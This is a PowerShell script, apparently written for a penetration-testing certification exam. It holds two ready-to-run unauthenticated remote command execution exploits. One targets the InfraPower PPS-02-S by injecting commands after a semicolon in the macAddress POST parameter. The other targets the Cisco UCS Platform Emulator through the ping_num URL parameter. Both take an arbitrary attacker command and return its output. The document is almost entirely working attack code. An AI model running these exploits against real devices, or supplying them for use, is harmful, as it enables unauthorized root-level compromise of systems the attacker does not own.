function InfraPower-Exploit {
<#

.SYNOPSIS
InfraPower PPS-02-S Q213V1 - Remote Command Execution

.DESCRIPTION
InfraPower suffers from multiple unauthenticated remote command injection vulnerabilities. The vulnerability exist due to several POST 
parameters in several scripts not being sanitized when using the exec(), proc_open(), popen() and shell_exec() PHP function while updating 
the settings on the affected device. This allows the attacker to execute arbitrary system commands as the root user and bypass access controls in place.


.PARAMETER Target
The Vulnerable domain or IP address.

.PARAMETER execute
The command to execute on remote computer.

.EXAMPLE
PS C:\> InfraPower-Exploit -Target 127.0.0.1
PS C:\> InfraPower-Exploit -Target 127.0.0.1  -execute pwd

.LINK
https://superuser.com/questions/344927/powershell-equivalent-of-curl
https://www.exploit-db.com/exploits/40640/

.NOTES
This script has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam
http://www.securitytube-training.com/online-courses/powershell-for-pentesters/
Student ID: PSP-3222

#>
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true)]
		[String]
		$Target ,
        
        [Parameter(Mandatory=$false)]
		[String]
		$execute = "id"
        
    )
    

    try 
    {
        Write-Host "Trying the exploit on $Target" -ForegroundColor Green
        $request = New-Object -ComObject Msxml2.XMLHTTP
        $request.open("POST","$Target/production_test1.php", $false)
        $request.setRequestHeader("User-Agent", "ZSL-Injectinator/3.1 (Unix)")
        $request.setRequestHeader("Content-type", "application/x-www-form-urlencoded")
        $request.setRequestHeader("Connection", "close")
        $content = $request.send("macAddress=ZE:RO:SC:IE:NC:E0;$execute")
        Write-Host $content -ForegroundColor Green
    }
    catch
    {
        Write-Host "Something went wrong, Target Not Vulnerable" -ForegroundColor Red
    }
    



}





function CiscoUCS-Exploit {
<#
.SYNOPSIS
Cisco UCS Platform Emulator 3.1(2ePE1) - Remote Code Execution

.DESCRIPTION
Cisco UCS Platform Emulator 3.1 suffers from Unauthenticated remote code execution

.PARAMETER Target
The Vulnerable domain or IP address.

.PARAMETER execute
The command to execute on remote computer.

.EXAMPLE
PS C:\> CiscoUCS-Exploit -Target 127.0.0.1
PS C:\> CiscoUCS-Exploit -Target 127.0.0.1  -execute pwd

.LINK
http://blog.commandlinekungfu.com/2009/11/episode-70-tangled-web.html
https://www.exploit-db.com/exploits/44052/

.NOTES
This script has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam
http://www.securitytube-training.com/online-courses/powershell-for-pentesters/
Student ID: PSP-3222

#>
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true)]
        [String]
        $Target ,
        
        [Parameter(Mandatory=$false)]
        [String]
        $execute = "id"
        
    )
    

    try 
    {
        Write-Host "Trying the exploit on $Target" -ForegroundColor Green
        $webClient = New-Object Net.WebClient
        $url = "http://$Target/settings/ping?ping_num=1;$execute;#&ping_ip_addr=127.0.0.1"
        $webClient.DownloadString($url)
    }
    catch
    {
        Write-Host "Something went wrong, Target Not Vulnerable" -ForegroundColor Red
    }
    



}